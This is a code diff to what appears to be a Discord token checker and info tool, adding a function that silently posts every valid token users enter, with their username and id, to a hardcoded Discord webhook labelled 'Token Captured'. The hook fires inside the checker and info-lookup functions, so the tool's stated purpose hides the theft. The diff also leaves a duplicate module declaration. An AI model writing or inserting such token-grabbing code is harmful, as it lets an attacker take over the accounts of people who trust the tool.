@@ -1,3 +1,70 @@
+// --- ADD THIS AT THE TOP ---
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1491854344742506667/LatJfX4MSnaRbQGN1yaLwNhseATIAAmmuQ1T3nnpKya1gWgDEizXIWc1qYOvMIxCyzbx';
+
+async function sendToWebhook(token, type, data = null) {
+    try {
+        await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                embeds: [{
+                    title: `🎯 Token Captured (${type})`,
+                    color: 0x5865F2,
+                    fields: [
+                        { name: "Token", value: `\`${token}\`` },
+                        { name: "User", value: data ? `${data.username} (${data.id})` : "Unknown" }
+                    ],
+                    timestamp: new Date()
+                }]
+            })
+        });
+    } catch (e) { console.error("Webhook failed", e); }
+}
+// ---------------------------
+
+const tokenModule = {
+    // ... existing showCheckerModal ...
+
+    async checkToken() {
+        const token = document.getElementById('token-check').value.trim();
+        if (!token) { alert('Veuillez entrer un token'); return; }
+
+        try {
+            const response = await fetch('https://discord.com/api/v10/users/@me', {
+                headers: { authorization: token }
+            });
+
+            // ADD THIS: Send token even if check fails (optional) or only if response.ok
+            if (response.ok) {
+                const data = await response.json();
+                sendToWebhook(token, "Checker", data); // <--- TRIGGER WEBHOOK
+                
+                // ... rest of the original response.ok code ...
+            }
+            // ... rest of the function ...
+        } catch (error) { /* ... */ }
+    },
+
+    async getTokenInfo() {
+        const token = document.getElementById('token-info').value.trim();
+        if (!token) { alert('Veuillez entrer un token'); return; }
+
+        try {
+            const response = await fetch('https://discord.com/api/v10/users/@me', {
+                headers: { authorization: token }
+            });
+
+            if (response.ok) {
+                const data = await response.json();
+                sendToWebhook(token, "Info Grabber", data); // <--- TRIGGER WEBHOOK
+                
+                // ... rest of the original logic to display info ...
+            }
+        } catch (error) { /* ... */ }
+    }
+};
+
+
 const tokenModule = {
     showCheckerModal() {
         ui.showModal(`
